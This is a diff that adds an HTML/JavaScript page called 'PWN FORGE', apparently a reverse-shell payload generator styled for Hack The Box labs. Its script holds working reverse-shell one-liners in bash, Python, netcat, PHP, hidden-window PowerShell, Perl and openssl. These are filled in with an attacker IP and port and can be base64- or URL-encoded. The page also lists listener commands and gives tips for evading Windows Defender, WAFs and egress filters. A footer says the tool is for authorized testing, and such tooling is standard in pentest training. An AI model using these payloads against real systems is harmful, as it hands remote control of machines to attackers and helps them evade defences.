@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>REVERB SHELL · PWN FORGE</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    }
+    body {
+      background: radial-gradient(ellipse at 30% 20%, #0a0c18 0%, #010208 100%);
+      height: 100vh;
+      overflow: hidden;
+    }
+    /* Ubuntu Server Terminal Style */
+    .ubuntu-terminal {
+      background: #2d0019;
+      background-image: linear-gradient(145deg, #2a0018 0%, #1a000f 100%);
+      border-radius: 14px;
+      box-shadow: 0 20px 35px -12px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.05);
+      border: 1px solid #c42e6b40;
+    }
+    .ubuntu-terminal .terminal-header {
+      background: #1f0012;
+      border-bottom: 1px solid #c42e6b40;
+      border-radius: 14px 14px 0 0;
+      padding: 10px 16px;
+    }
+    .ubuntu-terminal .terminal-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #ff5f56;
+      box-shadow: 0 0 4px #ff5f56;
+    }
+    .ubuntu-terminal .terminal-dot:nth-child(2) { background: #ffbd2e; box-shadow: 0 0 4px #ffbd2e; }
+    .ubuntu-terminal .terminal-dot:nth-child(3) { background: #27c93f; box-shadow: 0 0 4px #27c93f; }
+    .ubuntu-terminal pre {
+      font-family: 'JetBrains Mono', 'Fira Code', monospace;
+      font-size: 0.8rem;
+      background: transparent;
+      color: #f0e6d2;
+      text-shadow: 0 0 2px #ff69b430;
+    }
+    /* Kali Linux Terminal Style */
+    .kali-terminal {
+      background: #0c0e1a;
+      background-image: linear-gradient(145deg, #111524 0%, #080b14 100%);
+      border-radius: 14px;
+      border: 1px solid #00d9ff30;
+      box-shadow: 0 0 20px rgba(0, 217, 255, 0.15);
+    }
+    .kali-terminal .term-header {
+      background: #0a0d18;
+      border-bottom: 1px solid #00d9ff40;
+      padding: 8px 16px;
+      border-radius: 14px 14px 0 0;
+    }
+    .kali-prompt-user { color: #6cffb0; }
+    .kali-prompt-path { color: #5dade2; }
+    .cmd-text { color: #f8f8f2; }
+    .code-scroll::-webkit-scrollbar { width: 4px; height: 4px; }
+    .code-scroll::-webkit-scrollbar-track { background: #1e1a2f; }
+    .code-scroll::-webkit-scrollbar-thumb { background: #c42e6b; border-radius: 6px; }
+    .badge-htb { background: linear-gradient(135deg, #00d4ff20, #ff00a620); border: 1px solid #ff44cc40; }
+    
+    /* Control bar top style */
+    .control-bar {
+      background: rgba(8, 12, 25, 0.85);
+      backdrop-filter: blur(16px);
+      border: 1px solid rgba(45, 212, 191, 0.3);
+      box-shadow: 0 8px 20px -8px rgba(0,0,0,0.5);
+    }
+    .input-ghost { background: rgba(0, 0, 0, 0.5); transition: all 0.2s ease; }
+    .input-ghost:focus { background: rgba(0, 0, 0, 0.7); border-color: #2dd4bf; box-shadow: 0 0 0 2px rgba(45,212,191,0.2); }
+    .btn-generator { background: linear-gradient(105deg, #0d9488 0%, #0f766e 100%); transition: transform 0.1s ease; }
+    .btn-generator:active { transform: scale(0.96); }
+    .btn-secondary { background: rgba(45, 212, 191, 0.15); border: 1px solid rgba(45, 212, 191, 0.4); transition: all 0.2s; }
+    .btn-secondary:hover { background: rgba(45, 212, 191, 0.3); border-color: #2dd4bf; }
+    
+    /* Select dropdown styling */
+    .select-encoding {
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(45, 212, 191, 0.4);
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .select-encoding:hover { border-color: #2dd4bf; background: rgba(0, 0, 0, 0.7); }
+    
+    /* Modal styles */
+    .modal-backdrop {
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(12px);
+    }
+    .modal-card {
+      transform: scale(0.96);
+      transition: transform 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      max-height: 85vh;
+    }
+    .modal-card.active { transform: scale(1); }
+    .tip-card { background: linear-gradient(135deg, #0f172a 0%, #0a0f1c 100%); border-left: 3px solid #2dd4bf; }
+    .warning-card { border-left-color: #f59e0b; }
+    
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+    
+    /* Hidden raw payload storage */
+    #rawPayloadStorage {
+      position: absolute;
+      left: -9999px;
+      top: -9999px;
+      opacity: 0;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body class="h-screen w-screen overflow-hidden flex flex-col">
+
+  <!-- TOP CONTROL BAR -->
+  <div class="control-bar mx-4 mt-4 mb-3 rounded-2xl px-4 py-2.5 flex flex-wrap items-center justify-between gap-3 shadow-xl">
+    <div class="flex items-center gap-3 flex-wrap">
+      <div class="flex items-center gap-2 bg-black/40 rounded-full px-3 py-1.5 border border-teal-500/30">
+        <i class="fas fa-network-wired text-teal-300 text-xs"></i>
+        <input type="text" id="targetIp" value="10.10.16.5" class="w-32 bg-transparent border-none text-white text-sm focus:outline-none font-mono placeholder-gray-400" placeholder="LHOST">
+      </div>
+      <div class="flex items-center gap-2 bg-black/40 rounded-full px-3 py-1.5 border border-teal-500/30">
+        <i class="fas fa-plug text-teal-300 text-xs"></i>
+        <input type="number" id="targetPort" value="4444" class="w-20 bg-transparent border-none text-white text-sm focus:outline-none font-mono">
+      </div>
+      <div class="relative">
+        <select id="payloadSelect" class="bg-black/50 border border-teal-500/50 rounded-full text-white text-sm py-1.5 pl-4 pr-8 focus:outline-none focus:border-teal-400 cursor-pointer">
+          <option value="bash_tcp">🐚 BASH /dev/tcp</option>
+          <option value="bash_udp">🌀 BASH UDP</option>
+          <option value="python3">🐍 PYTHON3 reverse</option>
+          <option value="python_pty">🐍 PYTHON + PTY</option>
+          <option value="nc_e">⚡ NETCAT -e</option>
+          <option value="nc_mkfifo">📡 NETCAT mkfifo</option>
+          <option value="php">🐘 PHP reverse</option>
+          <option value="powershell">🪟 POWERSHELL</option>
+          <option value="perl">💎 PERL</option>
+        </select>
+      </div>
+      
+      <!-- ENCODING SELECT BOX -->
+      <div class="flex items-center gap-2">
+        <i class="fas fa-dice-d6 text-teal-300 text-xs"></i>
+        <select id="encodingSelect" class="select-encoding rounded-full text-white text-sm py-1.5 pl-3 pr-7 focus:outline-none font-mono">
+          <option value="plain">📝 plain</option>
+          <option value="base64">🔒 base64 wrap</option>
+          <option value="url">🔗 url encoded</option>
+        </select>
+      </div>
+      
+      <label class="flex items-center gap-1.5 text-xs text-gray-300 bg-black/30 px-3 py-1.5 rounded-full cursor-pointer hover:bg-teal-900/20 transition">
+        <input type="checkbox" id="sslToggle" class="accent-teal-400"> 🔒 ssl wrap
+      </label>
+    </div>
+    <div class="flex items-center gap-2">
+      <button id="copyPayloadBtn" class="btn-secondary text-white font-medium py-1.5 px-4 rounded-full text-sm flex items-center gap-2 transition-all">
+        <i class="far fa-copy"></i> copy
+      </button>
+      <button id="openModalBtn" class="btn-secondary text-white font-medium py-1.5 px-4 rounded-full text-sm flex items-center gap-2 transition-all">
+        <i class="fas fa-info-circle"></i> details
+      </button>
+      <button id="generateBtn" class="btn-generator text-white font-bold py-1.5 px-5 rounded-full text-sm shadow-lg flex items-center gap-2 transition-all">
+        <i class="fas fa-bolt"></i> generate
+      </button>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT (2 terminals side by side) -->
+  <div class="flex-1 flex gap-5 px-4 pb-4 min-h-0">
+    
+    <!-- LEFT: UBUNTU SERVER TERMINAL (payload snippet) -->
+    <div class="ubuntu-terminal flex flex-col overflow-hidden shadow-2xl w-1/2">
+      <div class="terminal-header flex items-center gap-2">
+        <div class="flex gap-1.5">
+          <div class="terminal-dot"></div>
+          <div class="terminal-dot"></div>
+          <div class="terminal-dot"></div>
+        </div>
+        <div class="flex-1 text-center text-[11px] font-mono text-pink-300/80 tracking-wider">user@ubuntu:~/reverb$ — payload studio</div>
+        <div class="text-[10px] text-pink-400/60"><i class="fas fa-terminal"></i></div>
+      </div>
+      <div class="flex-1 bg-black/40 p-4 overflow-auto code-scroll">
+        <div class="flex items-center gap-2 text-green-400 text-xs font-mono border-b border-pink-500/30 pb-2 mb-3">
+          <i class="fas fa-play-circle text-pink-400"></i>
+          <span>➜ reverse shell one-liner (ready)</span>
+        </div>
+        <pre id="shellOutput" class="text-sm whitespace-pre-wrap break-all font-mono leading-relaxed" style="color: #e2dcd0;"># ⚡ waiting for config...
+# set IP, port & payload type</pre>
+        <div class="mt-4 text-[10px] font-mono text-gray-500 border-t border-pink-500/20 pt-2 flex gap-4">
+          <span><i class="fas fa-database text-pink-400"></i> size: <span id="payloadSizeBytes">0</span> B</span>
+          <span><i class="fas fa-globe"></i> target: <span id="liveTargetDisplay">10.10.16.5:4444</span></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT: KALI LINUX TERMINAL (listener examples) -->
+    <div class="kali-terminal flex flex-col overflow-hidden shadow-2xl w-1/2">
+      <div class="term-header flex items-center justify-between">
+        <div class="flex items-center gap-2">
+          <i class="fab fa-linux text-cyan-400 text-sm"></i>
+          <span class="text-cyan-300 text-xs font-mono font-bold">kali@htb-pwnbox</span>
+          <span class="text-gray-500 text-[10px]">~/listeners</span>
+        </div>
+        <div class="flex items-center gap-2">
+          <i class="fas fa-broadcast-tower text-cyan-400/70 text-xs"></i>
+          <span class="text-[10px] text-cyan-400/60">listener vault</span>
+        </div>
+      </div>
+      <div class="flex-1 p-4 overflow-auto code-scroll bg-[#0a0c14]/80">
+        <div class="mb-4 flex flex-wrap justify-between items-center border-b border-cyan-500/30 pb-2">
+          <span class="text-cyan-300 text-xs font-bold"><i class="fas fa-plug"></i> ACTIVE TARGET</span>
+          <span class="text-gray-400 text-[10px] font-mono"><span id="listenerIpPreview" class="text-cyan-300">10.10.16.5</span>:<span id="listenerPortPreview" class="text-pink-300">4444</span></span>
+        </div>
+        
+        <!-- netcat classic -->
+        <div class="mb-3">
+          <div class="flex items-center gap-2 flex-wrap">
+            <span class="kali-prompt-user">kali@htb</span><span class="kali-prompt-path">:~$</span>
+            <span class="cmd-text text-sm font-mono break-all">nc -lvnp <span class="listener-port-val">4444</span></span>
+            <button data-cmd="nc -lvnp PORT" class="copy-listener-btn ml-auto text-[9px] bg-gray-800 hover:bg-cyan-800 px-2 py-0.5 rounded transition"><i class="far fa-copy"></i></button>
+          </div>
+          <div class="text-gray-400 text-[10px] ml-6 mt-0.5"><i class="fas fa-info-circle"></i> classic netcat listener (most common)</div>
+        </div>
+        <!-- rlwrap nc -->
+        <div class="mb-3">
+          <div class="flex items-center gap-2 flex-wrap">
+            <span class="kali-prompt-user">kali@htb</span><span class="kali-prompt-path">:~$</span>
+            <span class="cmd-text text-sm font-mono break-all">rlwrap nc -lvnp <span class="listener-port-val">4444</span></span>
+            <button data-cmd="rlwrap nc -lvnp PORT" class="copy-listener-btn ml-auto text-[9px] bg-gray-800 hover:bg-cyan-800 px-2 py-0.5 rounded"><i class="far fa-copy"></i></button>
+          </div>
+          <div class="text-gray-400 text-[10px] ml-6">arrow keys & tab completion</div>
+        </div>
+        <!-- ncat ssl -->
+        <div class="mb-3">
+          <div class="flex items-center gap-2 flex-wrap">
+            <span class="kali-prompt-user">kali@htb</span><span class="kali-prompt-path">:~$</span>
+            <span class="cmd-text text-sm font-mono break-all">ncat -lvnp <span class="listener-port-val">4444</span> --ssl</span>
+            <button data-cmd="ncat -lvnp PORT --ssl" class="copy-listener-btn ml-auto text-[9px] bg-gray-800 hover:bg-cyan-800 px-2 py-0.5 rounded"><i class="far fa-copy"></i></button>
+          </div>
+          <div class="text-gray-400 text-[10px] ml-6">encrypted ncat (openssl) listener</div>
+        </div>
+        <!-- socat pty -->
+        <div class="mb-3">
+          <div class="flex items-center gap-2 flex-wrap">
+            <span class="kali-prompt-user">kali@htb</span><span class="kali-prompt-path">:~$</span>
+            <span class="cmd-text text-sm font-mono break-all">socat TCP-LISTEN:<span class="listener-port-val">4444</span>,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane</span>
+            <button data-cmd="socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane" class="copy-listener-btn ml-auto text-[9px] bg-gray-800 hover:bg-cyan-800 px-2 py-0.5 rounded"><i class="far fa-copy"></i></button>
+          </div>
+          <div class="text-gray-400 text-[10px] ml-6">full PTY socat listener</div>
+        </div>
+        <!-- metasploit handler -->
+        <div class="mb-3">
+          <div class="flex items-center gap-2 flex-wrap">
+            <span class="kali-prompt-user">kali@htb</span><span class="kali-prompt-path">:~$</span>
+            <span class="cmd-text text-sm font-mono break-all">msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST <span id="msfIpPlaceholder">10.10.16.5</span>; set LPORT <span class="listener-port-val">4444</span>; run"</span>
+            <button data-cmd="msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST IPHERE; set LPORT PORT; run'" class="copy-listener-btn ml-auto text-[9px] bg-gray-800 hover:bg-cyan-800 px-2 py-0.5 rounded"><i class="far fa-copy"></i></button>
+          </div>
+        </div>
+        <!-- pwncat -->
+        <div class="mb-2">
+          <div class="flex items-center gap-2 flex-wrap">
+            <span class="kali-prompt-user">kali@htb</span><span class="kali-prompt-path">:~$</span>
+            <span class="cmd-text text-sm font-mono break-all">pwncat-cs -lp <span class="listener-port-val">4444</span></span>
+            <button data-cmd="pwncat-cs -lp PORT" class="copy-listener-btn ml-auto text-[9px] bg-gray-800 hover:bg-cyan-800 px-2 py-0.5 rounded"><i class="far fa-copy"></i></button>
+          </div>
+          <div class="text-gray-400 text-[10px] ml-6">auto-upload/download, linenum, awesome listener</div>
+        </div>
+        <div class="mt-3 text-[11px] text-cyan-400/70 border-t border-cyan-500/20 pt-2 flex justify-between">
+          <span><i class="fas fa-key"></i> listener tip: match LHOST to your tunnel IP</span>
+          <i class="fas fa-crown text-yellow-500/60"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Hidden element for clean raw payload storage -->
+  <textarea id="rawPayloadStorage" style="position: fixed; left: -9999px; top: -9999px; opacity: 0;"></textarea>
+
+  <!-- MODAL: DETAILS, TIPS & TRICKS -->
+  <div id="detailModal" class="fixed inset-0 z-[1000] hidden items-center justify-center p-4 transition-all">
+    <div class="absolute inset-0 modal-backdrop" id="modalBackdrop"></div>
+    <div class="relative modal-card bg-[#0a0f1c] border border-teal-500/50 rounded-2xl shadow-2xl max-w-4xl w-full overflow-hidden flex flex-col">
+      <div class="flex items-center justify-between px-6 py-4 border-b border-teal-500/30 bg-black/40">
+        <div class="flex items-center gap-2">
+          <i class="fas fa-lightbulb text-teal-300 text-xl"></i>
+          <h3 class="text-xl font-bold text-white">reverse shell · advanced tips & tricks</h3>
+        </div>
+        <button id="closeModalBtn" class="text-gray-400 hover:text-teal-300 transition text-2xl">&times;</button>
+      </div>
+      <div class="flex-1 overflow-y-auto p-6 space-y-5 code-scroll">
+        <div class="tip-card rounded-xl p-4">
+          <div class="flex items-center gap-2 text-teal-300 font-semibold mb-2"><i class="fas fa-skull-crosswalk"></i> <span>what is a reverse shell?</span></div>
+          <p class="text-gray-300 text-sm leading-relaxed">A reverse shell forces the target to initiate a connection back to the attacker's machine, bypassing inbound firewall restrictions. Essential for CTF, HTB, and authorized pentesting.</p>
+        </div>
+        
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <div class="bg-black/40 rounded-xl p-3 border border-teal-500/20">
+            <i class="fas fa-chart-line text-teal-400 text-sm"></i>
+            <span class="text-white text-sm font-semibold ml-1">stabilize your shell</span>
+            <pre class="text-xs font-mono bg-black/60 p-2 mt-2 rounded text-teal-200 overflow-x-auto">python3 -c 'import pty;pty.spawn("/bin/bash")'<br>export TERM=xterm<br>Ctrl+Z → stty raw -echo; fg → reset</pre>
+          </div>
+          <div class="bg-black/40 rounded-xl p-3 border border-teal-500/20">
+            <i class="fas fa-shield-haltered text-amber-400 text-sm"></i>
+            <span class="text-white text-sm font-semibold ml-1">evasion techniques</span>
+            <ul class="text-xs text-gray-300 mt-2 space-y-1 list-disc pl-4">
+              <li>Base64 / URL encoding (select from dropdown)</li>
+              <li>SSL wrapping via openssl or ncat</li>
+              <li>PowerShell with -enc for Windows</li>
+            </ul>
+          </div>
+          <div class="bg-black/40 rounded-xl p-3 border border-teal-500/20">
+            <i class="fas fa-tools text-cyan-400 text-sm"></i>
+            <span class="text-white text-sm font-semibold ml-1">common pitfalls</span>
+            <ul class="text-xs text-gray-300 mt-2 space-y-1 list-disc pl-4">
+              <li>Firewall egress filtering — try different ports (443, 80, 53)</li>
+              <li>Missing netcat: use python or bash fallback</li>
+              <li>Windows Defender: obfuscate PowerShell</li>
+            </ul>
+          </div>
+          <div class="bg-black/40 rounded-xl p-3 border border-teal-500/20">
+            <i class="fas fa-dice-d6 text-purple-400 text-sm"></i>
+            <span class="text-white text-sm font-semibold ml-1">encoding methods</span>
+            <p class="text-xs text-gray-300 mt-2"><span class="text-teal-300">Plain:</span> raw execution. <span class="text-teal-300">Base64:</span> echo b64|base64 -d|bash. <span class="text-teal-300">URL:</span> bypass WAF/URL filters.</p>
+          </div>
+        </div>
+        
+        <div class="warning-card bg-amber-950/20 rounded-xl p-4 border-l-3 border-amber-500">
+          <div class="flex items-center gap-2 text-amber-300 font-semibold"><i class="fas fa-ear-listen"></i> listener pro tips</div>
+          <ul class="text-xs text-gray-300 mt-2 space-y-1 ml-4 list-disc">
+            <li><span class="text-cyan-300">rlwrap:</span> adds history and arrow keys to netcat sessions.</li>
+            <li><span class="text-cyan-300">socat:</span> provides full PTY, tab completion, and signal handling.</li>
+            <li><span class="text-cyan-300">pwncat-cs:</span> modern listener with file upload/download.</li>
+            <li>Always use <code class="bg-black/60 px-1 rounded">stty raw -echo; fg</code> after backgrounding netcat.</li>
+          </ul>
+        </div>
+        
+        <div class="bg-teal-900/20 rounded-xl p-3">
+          <span class="text-teal-300 text-xs font-bold"><i class="fas fa-terminal"></i> one-liner examples</span>
+          <div class="grid grid-cols-1 gap-2 mt-2 text-xs font-mono">
+            <div class="bg-black/60 p-2 rounded"><span class="text-pink-300">bash:</span> bash -i >& /dev/tcp/10.10.14.1/4444 0>&1</div>
+            <div class="bg-black/60 p-2 rounded"><span class="text-pink-300">python:</span> python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'</div>
+          </div>
+        </div>
+        
+        <div class="text-[11px] text-gray-500 border-t border-gray-700 pt-3 flex justify-between">
+          <span><i class="fas fa-shield-alt"></i> for authorized testing only · HTB style</span>
+          <span>reverb engine v2</span>
+        </div>
+      </div>
+      <div class="px-6 py-3 border-t border-teal-500/30 flex justify-end bg-black/30">
+        <button id="closeModalFooterBtn" class="bg-teal-700/60 hover:bg-teal-600 text-white px-5 py-1.5 rounded-full text-sm transition">got it</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- TOAST NOTIFICATION -->
+  <div id="toastMsg" class="fixed bottom-5 left-1/2 transform -translate-x-1/2 bg-black/80 backdrop-blur border border-teal-400 text-white px-4 py-2 rounded-full text-xs font-mono hidden z-50 transition-all shadow-lg"></div>
+
+  <script>
+    // ========== JSON PAYLOAD DATASET ==========
+    const PAYLOAD_JSON = {
+      payloads: [
+        { id: "bash_tcp", name: "BASH TCP", template: "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1", supportsSsl: true },
+        { id: "bash_udp", name: "BASH UDP", template: "bash -i >& /dev/udp/{{IP}}/{{PORT}} 0>&1", supportsSsl: false },
+        { id: "python3", name: "PYTHON3", template: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{IP}}\",{{PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", supportsSsl: false },
+        { id: "python_pty", name: "PYTHON PTY", template: "python3 -c 'import pty; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{{IP}}\",{{PORT}})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/bash\")'", supportsSsl: false },
+        { id: "nc_e", name: "NETCAT -e", template: "nc -e /bin/sh {{IP}} {{PORT}}", supportsSsl: false },
+        { id: "nc_mkfifo", name: "NETCAT mkfifo", template: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{IP}} {{PORT}} > /tmp/f", supportsSsl: true },
+        { id: "php", name: "PHP", template: "php -r '$sock=fsockopen(\"{{IP}}\",{{PORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'", supportsSsl: false },
+        { id: "powershell", name: "POWERSHELL", template: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{{IP}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", supportsSsl: false },
+        { id: "perl", name: "PERL", template: "perl -e 'use Socket;$i=\"{{IP}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", supportsSsl: false }
+      ],
+      sslOverrides: {
+        bash_tcp: "(openssl s_client -quiet -connect {{IP}}:{{PORT}} -ign_eof 2>/dev/null | /bin/sh 2>&1 | openssl s_client -quiet -connect {{IP}}:{{PORT}} 2>/dev/null) &",
+        nc_mkfifo: "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | openssl s_client -quiet -connect {{IP}}:{{PORT}} 2>/dev/null > /tmp/f"
+      }
+    };
+
+    // DOM elements
+    const ipInput = document.getElementById('targetIp');
+    const portInput = document.getElementById('targetPort');
+    const payloadSelect = document.getElementById('payloadSelect');
+    const generateBtn = document.getElementById('generateBtn');
+    const shellOutputPre = document.getElementById('shellOutput');
+    const payloadSizeSpan = document.getElementById('payloadSizeBytes');
+    const sslToggle = document.getElementById('sslToggle');
+    const liveTargetDisplay = document.getElementById('liveTargetDisplay');
+    const listenerIpPreview = document.getElementById('listenerIpPreview');
+    const listenerPortPreview = document.getElementById('listenerPortPreview');
+    const msfIpPlaceholder = document.getElementById('msfIpPlaceholder');
+    const copyPayloadBtn = document.getElementById('copyPayloadBtn');
+    const encodingSelect = document.getElementById('encodingSelect');
+    const rawStorage = document.getElementById('rawPayloadStorage');
+    
+    // Modal elements
+    const modal = document.getElementById('detailModal');
+    const openModalBtn = document.getElementById('openModalBtn');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+    const closeModalFooterBtn = document.getElementById('closeModalFooterBtn');
+    const modalBackdrop = document.getElementById('modalBackdrop');
+
+    let currentRawPayload = ""; // Store clean payload without formatting
+
+    function getEncoding() { return encodingSelect.value; }
+    
+    function getPayloadById(id) { return PAYLOAD_JSON.payloads.find(p => p.id === id); }
+    
+    function buildRawCommand(payloadObj, ip, port, sslFlag) {
+      if (!payloadObj) return "# error";
+      let cmd = payloadObj.template.replace(/\{\{IP\}\}/g, ip).replace(/\{\{PORT\}\}/g, port);
+      if (sslFlag && payloadObj.supportsSsl && PAYLOAD_JSON.sslOverrides[payloadObj.id]) {
+        return PAYLOAD_JSON.sslOverrides[payloadObj.id].replace(/\{\{IP\}\}/g, ip).replace(/\{\{PORT\}\}/g, port);
+      } else if (sslFlag && !payloadObj.supportsSsl) {
+        cmd += "\n# [!] ssl not supported, using raw command";
+      }
+      return cmd;
+    }
+    
+    function applyEncoding(raw, style) {
+      if (style === 'plain') return raw;
+      if (style === 'base64') {
+        try { 
+          let b64 = btoa(unescape(encodeURIComponent(raw))); 
+          return `echo "${b64}" | base64 -d | bash`; 
+        } catch(e) { return raw; }
+      }
+      if (style === 'url') return encodeURIComponent(raw);
+      return raw;
+    }
+    
+    // Clean ANSI escape codes and special terminal sequences
+    function cleanTerminalArtifacts(text) {
+      // Remove common terminal escape sequences
+      return text
+        .replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '')  // ANSI escape codes
+        .replace(/\^\[\[[0-9]*~/, '')            // ^[[200~ style
+        .replace(/~$/, '')                        // trailing tilde
+        .replace(/\r/g, '')                       // carriage returns
+        .replace(/^\s*┌─.*\n/, '')               // remove banner lines
+        .replace(/^\s*└─◆ /, '')                 // remove prompt prefix
+        .trim();
+    }
+    
+    function generateShell() {
+      let ip = ipInput.value.trim();
+      let port = portInput.value.trim();
+      if (!ip) ip = "10.10.16.5";
+      if (!port || isNaN(port)) port = "4444";
+      portInput.value = port;
+      const payloadObj = getPayloadById(payloadSelect.value);
+      const sslActive = sslToggle.checked;
+      const encoding = getEncoding();
+      
+      if (!payloadObj) { 
+        shellOutputPre.innerText = "# payload error"; 
+        payloadSizeSpan.innerText = "0"; 
+        return; 
+      }
+      
+      let rawCommand = buildRawCommand(payloadObj, ip, port, sslActive);
+      let finalCommand = applyEncoding(rawCommand, encoding);
+      
+      // Store clean raw payload for copying (without any formatting)
+      currentRawPayload = finalCommand;
+      
+      // Display formatted version with banner for terminal aesthetic
+      const banner = `┌─[${payloadObj.name} @ ${ip}:${port}] | encoding: ${encoding}\n└─◆ `;
+      const displayOutput = `${banner}${finalCommand}`;
+      shellOutputPre.innerText = displayOutput;
+      payloadSizeSpan.innerText = new Blob([finalCommand]).size;
+      liveTargetDisplay.innerText = `${ip}:${port}`;
+      listenerIpPreview.innerText = ip;
+      listenerPortPreview.innerText = port;
+      msfIpPlaceholder.innerText = ip;
+      document.querySelectorAll('.listener-port-val').forEach(el => el.innerText = port);
+    }
+    
+    async function copyPayload() {
+      if (!currentRawPayload || currentRawPayload.includes("waiting")) { 
+        showToast("⚠️ generate a payload first", false); 
+        return; 
+      }
+      
+      try {
+        // Method 1: Try modern clipboard API with clean text
+        await navigator.clipboard.writeText(currentRawPayload);
+        showToast("✓ Clean payload copied to clipboard!", true);
+      } catch (err) {
+        // Fallback: use textarea method
+        const textarea = document.createElement('textarea');
+        textarea.value = currentRawPayload;
+        textarea.style.position = 'fixed';
+        textarea.style.left = '-9999px';
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        showToast("✓ Payload copied (fallback method)", true);
+      }
+    }
+    
+    function setupListenerButtons() {
+      document.querySelectorAll('.copy-listener-btn').forEach(btn => {
+        btn.addEventListener('click', async (e) => {
+          let rawCmd = btn.getAttribute('data-cmd');
+          if (!rawCmd) return;
+          let port = portInput.value.trim() || "4444";
+          let ip = ipInput.value.trim() || "10.10.16.5";
+          let final = rawCmd.replace(/PORT/g, port).replace(/IPHERE/g, ip);
+          try { 
+            await navigator.clipboard.writeText(final); 
+            showToast(`✓ Listener command copied`, true); 
+          } catch(err) { 
+            // Fallback
+            const textarea = document.createElement('textarea');
+            textarea.value = final;
+            textarea.style.position = 'fixed';
+            textarea.style.left = '-9999px';
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            showToast("✓ Listener copied", true);
+          }
+        });
+      });
+    }
+    
+    function showToast(msg, isSuccess) {
+      const toast = document.getElementById('toastMsg');
+      toast.innerText = msg;
+      toast.classList.remove('hidden');
+      toast.style.background = isSuccess ? '#0f172ad9' : '#4a0e2ed9';
+      toast.style.borderLeft = isSuccess ? '3px solid #2dd4bf' : '3px solid #ff66b5';
+      setTimeout(() => toast.classList.add('hidden'), 2000);
+    }
+    
+    function openModal() { 
+      modal.classList.remove('hidden'); 
+      modal.classList.add('flex'); 
+      document.body.style.overflow = 'hidden'; 
+    }
+    
+    function closeModal() { 
+      modal.classList.add('hidden'); 
+      modal.classList.remove('flex'); 
+      document.body.style.overflow = ''; 
+    }
+    
+    function bindEvents() {
+      generateBtn.addEventListener('click', generateShell);
+      copyPayloadBtn.addEventListener('click', copyPayload);
+      ipInput.addEventListener('input', generateShell);
+      portInput.addEventListener('input', generateShell);
+      payloadSelect.addEventListener('change', generateShell);
+      sslToggle.addEventListener('change', generateShell);
+      encodingSelect.addEventListener('change', generateShell);
+      setupListenerButtons();
+      openModalBtn.addEventListener('click', openModal);
+      closeModalBtn.addEventListener('click', closeModal);
+      closeModalFooterBtn.addEventListener('click', closeModal);
+      modalBackdrop.addEventListener('click', closeModal);
+    }
+    
+    function init() { 
+      bindEvents(); 
+      generateShell(); 
+    }
+    
+    init();
+  </script>
+</body>
+</html>
